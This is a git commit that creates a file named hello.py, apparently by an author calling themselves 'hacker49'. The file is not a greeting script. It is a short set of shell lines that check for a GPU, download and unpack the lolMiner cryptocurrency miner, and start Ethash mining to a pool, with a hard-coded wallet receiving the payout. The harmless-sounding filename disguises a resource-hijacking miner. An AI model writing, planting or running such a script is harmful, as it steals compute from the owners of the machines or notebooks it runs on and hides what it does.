2248afbd4c1ae22950a9578eb35e978252809ea7
hacker49 <150mkv@gmail.com>
2021-05-29 19:09:05 +0530

    Create hello.py

---
+++ hello.py
@@ -0,0 +1,6 @@
+! nvidia-smi
+! sudo apt update
+! sudo apt update
+! wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.28/lolMiner_v1.28a_Lin64.tar.gz
+! tar -xvf lolMiner_v1.28a_Lin64.tar.gz
+! ./1.28a/lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user WIN:TRg5jXpVkgEgP4i3N5PXx57mPbJJ2yBK6Y.sant
